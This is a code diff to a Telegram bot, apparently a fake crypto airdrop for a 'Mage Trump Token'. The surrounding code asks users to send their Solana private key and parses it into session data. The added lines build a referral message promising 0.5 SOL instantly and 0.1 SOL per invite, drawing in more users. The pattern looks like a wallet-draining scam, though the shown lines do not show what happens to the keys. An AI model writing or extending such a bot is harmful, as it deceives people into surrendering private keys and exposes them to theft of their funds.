@@ -96,7 +96,21 @@ bot.command('link', (ctx) => {
   if (isFlooding(ctx, 'link')) return ctx.reply('⏳ Wait a moment before trying /link again.');
   const s = ctx.session?.walletData;
   if (!s) return ctx.reply('❌ You are not connected. Send your private key first.');
-  ctx.reply(`🔗 Your referral link:\nhttps://magetoken.com.br/?ref=${s.pubkey}`);
+
+  const message = `
+📢 Want free SOL?
+
+Join the *Mage Trump Token* airdrop and earn 0.5 SOL instantly!  
+🎯 Plus, get 0.1 SOL for each wizard you invite.
+
+🚀 Use my referral link now:  
+https://magetoken.com.br/?ref=${s.pubkey}
+
+Let's farm together! 🧙‍♂️  
+#Crypto #Airdrop #SOL #MageTrump
+  `.trim();
+
+  ctx.replyWithMarkdown(message);
 });
 
 // /referrals
@@ -116,7 +130,6 @@ bot.on('text', async (ctx) => {
 
   try {
     let secret;
-
     if (input.startsWith('[')) {
       secret = JSON.parse(input);
     } else {
@@ -158,7 +171,7 @@ bot.on('text', async (ctx) => {
       projectBalance = '0.5';
     }
 
-    ctx.session ??= {}; // Garante que a sessão existe
+    ctx.session ??= {};
     ctx.session.walletData = { pubkey, solBalance, projectBalance, refCount, canClaim };
 
     await ctx.replyWithMarkdown(formatStatus(pubkey, solBalance, projectBalance, refCount, canClaim));
